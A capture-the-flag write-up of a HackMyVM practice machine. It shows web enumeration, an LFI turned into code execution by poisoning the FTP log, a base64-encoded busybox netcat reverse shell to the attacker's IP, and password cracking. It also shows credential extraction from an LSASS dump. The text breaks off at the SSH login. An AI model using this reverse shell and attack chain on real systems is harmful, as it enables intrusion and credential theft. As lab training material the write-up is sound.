# Medusa

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Medusa | noname | Beginner | HackMyVM |

**Summary:** Medusa is a beginner-friendly Linux machine that demonstrates the exploitation of web application vulnerabilities through a combination of directory enumeration, virtual host discovery, Local File Inclusion (LFI), and log poisoning techniques. The initial attack vector requires discovering a hidden subdomain through fuzzing, which exposes a vulnerable PHP application with a file inclusion vulnerability. By leveraging the LFI to read system logs and poisoning the vsFTPd log file with PHP code injection, an attacker can achieve remote code execution as the www-data user. Lateral movement to the user account is accomplished by extracting and cracking a password-protected ZIP file containing an LSASS memory dump from a Windows system, which reveals cleartext credentials stored in the dump. Finally, privilege escalation to root is achieved by exploiting the disk group membership, which allows reading arbitrary files including /etc/shadow using debugfs, followed by offline password cracking to recover the root password.

---

## Reconnaissance

The first step involved identifying the target machine on the network using a PowerShell scanning tool that detected a VirtualBox virtual machine.

```
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.163 08:00:27:FF:30:D8 VirtualBox
```

With the target IP address confirmed as 192.168.100.163, I proceeded to enumerate the available services using Nmap with service detection and default scripts enabled.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ip=192.168.100.163 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-04 08:20 WIB
Nmap scan report for 192.168.100.163
Host is up (0.0018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
```

The scan revealed three open ports: FTP (21), SSH (22), and HTTP (80). The FTP service was running vsFTPd 3.0.3, SSH was OpenSSH 8.4p1 on Debian, and the web server was Apache 2.4.54.

### FTP Enumeration

I attempted to access the FTP service using anonymous credentials to check for publicly accessible files.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ftp $ip
Connected to 192.168.100.163.
220 (vsFTPd 3.0.3)
Name (192.168.100.163:ouba): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> bye
221 Goodbye.
```

Anonymous FTP access was disabled, so I moved on to web application enumeration.

### Web Application Enumeration

Visiting the web server on port 80 displayed the default Apache2 Debian page, which appeared unusual as it suggested the web server might be hosting additional content in other directories or virtual hosts.

![](image.png)

To discover hidden directories, I performed directory brute-forcing using Gobuster with a comprehensive wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ gobuster dir -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 319] [--> http://192.168.100.163/manual/]
/server-status        (Status: 403) [Size: 280]
/hades                (Status: 301) [Size: 318] [--> http://192.168.100.163/hades/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

The scan revealed an interesting directory called /hades, which warranted further investigation. I continued enumerating this directory to find any PHP files or other endpoints.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ffuf -u $url/hades/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.php,.html -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.163/hades/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .txt .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
.html                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 578ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1791ms]
door.php                [Status: 200, Size: 555, Words: 63, Lines: 19, Duration: 41ms]
```

The file door.php was discovered, which appeared to be an interactive page that prompted for a "magic word."

![](image-1.png)

Based on the Greek mythology theme (Medusa and Hades), I attempted the word "Kraken" as the magic word, which successfully revealed a domain name.

![](image-2.png)

The response indicated that I should add the domain to my local hosts file for proper virtual host resolution.

### Virtual Host Discovery

I added the discovered domain to the /etc/hosts file to enable proper DNS resolution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ echo '192.168.100.163 medusa.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.163 medusa.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ip=medusa.hmv && url=http://$ip
```

With the domain configured, I performed virtual host enumeration to discover potential subdomains using ffuf with a common subdomains wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ffuf -u $url -H "Host: FUZZ.medusa.hmv" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 10674

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://medusa.hmv
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.medusa.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10674
________________________________________________

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 37ms]
:: Progress: [4989/4989] :: Job [1/1] :: 740 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

The subdomain "dev" was discovered, indicating a development environment. I added this to the hosts file as well.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ echo '192.168.100.163 dev.medusa.hmv' | sudo tee -a /etc/hosts
192.168.100.163 dev.medusa.hmv
```

---

## Initial Access

### Development Subdomain Enumeration

With access to the development subdomain, I conducted further directory and file enumeration to identify potential attack vectors.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ffuf -u http://dev.medusa.hmv/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.zip -ic -t 40 -mc 200,204,301,302,307,401,403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.medusa.hmv/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html .bak .zip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 10ms]
                        [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 11ms]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 12ms]
files                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 16ms]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4ms]
index.html              [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 1119ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 4ms]
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5ms]
robots.txt              [Status: 200, Size: 489, Words: 239, Lines: 16, Duration: 32ms]
```

The /files directory stood out as potentially containing sensitive files. I proceeded to enumerate this directory further.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ffuf -u http://dev.medusa.hmv/files/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.zip -ic -t 40 -mc 200,204,301,302,307,401,403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.medusa.hmv/files/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html .bak .zip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 10ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 18ms]
system.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
readme.txt              [Status: 200, Size: 144, Words: 10, Lines: 4, Duration: 45ms]
```

Two interesting files were discovered: system.php and readme.txt. The readme.txt file contained information that could provide clues about the application's functionality.

![](image-3.png)

### Local File Inclusion Discovery

The presence of system.php suggested a potential file viewing or execution functionality. I performed parameter fuzzing to identify the correct parameter name that could be exploited for Local File Inclusion.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ffuf -u "http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 26ms]
:: Progress: [6453/6453] :: Job [1/1] :: 980 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

The parameter "view" was identified as vulnerable to Local File Inclusion. I verified this by reading the /etc/passwd file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ url2=http://dev.medusa.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ curl $url2/files/system.php?view=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
spectre:x:1000:1000:spectre,,,:/home/spectre:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

The LFI vulnerability was confirmed, and I identified a valid user account named "spectre" with UID 1000.

### Log Poisoning Attack

To escalate the LFI vulnerability to Remote Code Execution, I employed a log poisoning technique by reading the vsFTPd log file and injecting malicious PHP code.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ curl -s "http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/var/log/vsftpd.log" | base64 -d | tail -n 15
Fri Apr  3 21:20:44 2026 [pid 519] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:45 2026 [pid 518] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 539] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 541] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 543] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:21:06 2026 [pid 545] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:21:11 2026 [pid 544] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:30 2026 [pid 572] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:33 2026 [pid 571] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:34 2026 [pid 574] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:35 2026 [pid 573] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:36 2026 [pid 577] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:38 2026 [pid 576] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:39 2026 [pid 579] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:41 2026 [pid 578] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
```

The log file was accessible, confirming that the www-data user had read permissions. I proceeded to inject PHP code by attempting an FTP login with a username containing PHP execution commands.

![](image-4.png)

After injecting the payload through an FTP login attempt, I tested whether the log poisoning was successful by executing a simple command through the cmd parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ curl -s "http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&cmd=id"
Fri Apr  3 21:20:36 2026 [pid 513] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:42 2026 [pid 521] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:42 2026 [pid 520] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:42 2026 [pid 522] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:42 2026 [pid 523] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:44 2026 [pid 514] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:44 2026 [pid 519] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:45 2026 [pid 518] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 539] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 541] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:20:46 2026 [pid 543] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:21:06 2026 [pid 545] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:21:11 2026 [pid 544] [anonymous] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:30 2026 [pid 572] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:33 2026 [pid 571] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:34 2026 [pid 574] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:35 2026 [pid 573] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:36 2026 [pid 577] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:38 2026 [pid 576] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:39 2026 [pid 579] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 21:26:41 2026 [pid 578] [kraken] FAIL LOGIN: Client "::ffff:192.168.100.1"
Fri Apr  3 22:15:46 2026 [pid 2161] CONNECT: Client "::ffff:192.168.100.1"
Fri Apr  3 22:16:03 2026 [pid 2160] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
] FAIL LOGIN: Client "::ffff:192.168.100.1"
```

The output confirmed successful remote code execution as the www-data user, as evidenced by the uid=33 response.

### Reverse Shell Establishment

With confirmed RCE, I established a reverse shell connection. First, I set up a netcat listener on my attacking machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

I then crafted a base64-encoded reverse shell payload using busybox to avoid issues with special characters in the URL.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ payload=$(echo -n "busybox nc 192.168.100.1 4444 -e sh" | base64 -w 0)

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ curl -s "http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&cmd=echo%20$payload%20|%20base64%20-d%20|%20sh"
```

The reverse shell successfully connected, providing an interactive shell as www-data.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 50617
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@medusa:/var/www/dev/files$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@medusa:/var/www/dev/files$ export SHELL=/bin/bash
www-data@medusa:/var/www/dev/files$ export TERM=xterm-256color
www-data@medusa:/var/www/dev/files$ stty rows 78 cols 178
```

The shell was upgraded to a fully interactive TTY using Python's pty module and proper terminal settings.

---

## Lateral Movement to User

### Internal Enumeration

Once inside the system as www-data, I began enumerating the filesystem to identify potential privilege escalation vectors or credentials.

```bash
www-data@medusa:/var/www/dev/files$ ls -la /home/spectre/
total 32
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .
drwxr-xr-x 3 root    root    4096 Jan 15  2023 ..
-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history
-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local
-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile
-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt
```

The user.txt flag was present in the spectre home directory but was not readable by www-data. I expanded my search to the root directory.

```bash
www-data@medusa:/var/www/dev/files$ cd /
www-data@medusa:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Apr  3 21:19 dev
drwxr-xr-x  71 root root  4096 Jan 30  2023 etc
drwxr-xr-x   3 root root  4096 Jan 15  2023 home
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan 15  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Jan 15  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan 15  2023 media
drwxr-xr-x   2 root root  4096 Jan 15  2023 mnt
drwxr-xr-x   2 root root  4096 Jan 15  2023 opt
dr-xr-xr-x 146 root root     0 Apr  3 21:19 proc
drwx------   3 root root  4096 Jan 30  2023 root
drwxr-xr-x  19 root root   540 Apr  3 21:19 run
lrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Jan 15  2023 srv
dr-xr-xr-x  13 root root     0 Apr  3 21:19 sys
drwxrwxrwt   2 root root  4096 Apr  3 21:21 tmp
drwxr-xr-x  14 root root  4096 Jan 15  2023 usr
drwxr-xr-x  12 root root  4096 Jan 15  2023 var
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
www-data@medusa:/$ cd ...
www-data@medusa:/...$ ls -la
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

An unusual hidden directory named "..." (three dots) was discovered in the root filesystem, containing a large ZIP file owned by www-data. This was highly suspicious and warranted investigation.

### Archive Analysis

I transferred the old_files.zip archive to my attacking machine for analysis using a temporary HTTP server.

```bash
www-data@medusa:/...$ which unzip
www-data@medusa:/...$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.100.1 - - [03/Apr/2026 22:27:45] "GET /old_files.zip HTTP/1.1" 200 -
```

On the attacking machine, I downloaded the file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ wget http://192.168.100.163:8080/old_files.zip
--2026-04-04 09:27:47--  http://192.168.100.163:8080/old_files.zip
Connecting to 192.168.100.163:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12387024 (12M) [application/zip]
Saving to: 'old_files.zip'

old_files.zip                    100%[=======================================================>]  11.81M  20.7MB/s    in 0.6s

2026-04-04 09:27:47 (20.7 MB/s) - 'old_files.zip' saved [12387024/12387024]
```

Attempting to extract the archive revealed that it was password protected and required a newer ZIP format.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ unzip old_files.zip
Archive:  old_files.zip
   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)
```

I used 7zip to extract the file, which confirmed password protection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ 7z x old_files.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:10240, ASM

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024


Enter password (will not be echoed):
ERROR: Wrong password : lsass.DMP

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

### Password Cracking

To crack the ZIP password, I used zip2john to extract the hash and then John the Ripper with the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ zip2john old_files.zip > zip_hash.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 12386830 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
med[REDACTED]        (old_files.zip/lsass.DMP)
1g 0:00:04:03 DONE (2026-04-04 09:35) 0.004104g/s 23236p/s 23236c/s 23236C/s megan0308..medabe15
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password was successfully cracked. I then extracted the archive contents.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ 7z x old_files.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:10240, ASM

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024


Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

The extracted file was an LSASS memory dump from a Windows system, which typically contains credential material.

### LSASS Dump Analysis

I used pypykatz to extract credentials from the LSASS dump file, searching specifically for the "spectre" user.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ pypykatz lsa minidump lsass.DMP | grep -i -A 10 "Username: spectre"
INFO:pypykatz:Parsing file lsass.DMP
                Username: spectre
                Domain: Medusa-PC
                LM: NA
                NT: 6ec779920e220c163f33101085eff0b9
                SHA1: 4d3341113c66127df14de8cc6ac7b4ebf52d74b5
                DPAPI: NA
        == WDIGEST [ce835]==
                username spectre
                domainname Medusa-PC
                password 5p3[REDACTED]
                password (hex)3500[REDACTED]
--
                Username: spectre
                Domain: Medusa-PC
                Password: 5p3[REDACTED]
                password (hex)3500[REDACTED]
                AES128 Key: 6ec779920e220c163f33101085eff0b9
        == WDIGEST [ce835]==
                username spectre
                domainname Medusa-PC
                password 5p3[REDACTED]
                password (hex)3500[REDACTED]
        == TSPKG [ce835]==
```

The dump revealed cleartext credentials for the spectre user, which were likely reused on the Linux system. I attempted SSH access using these credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/medusa]
└─$ ssh spectre@$ip
...
spectre@192.168.100.163's password:
Linux medusa 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

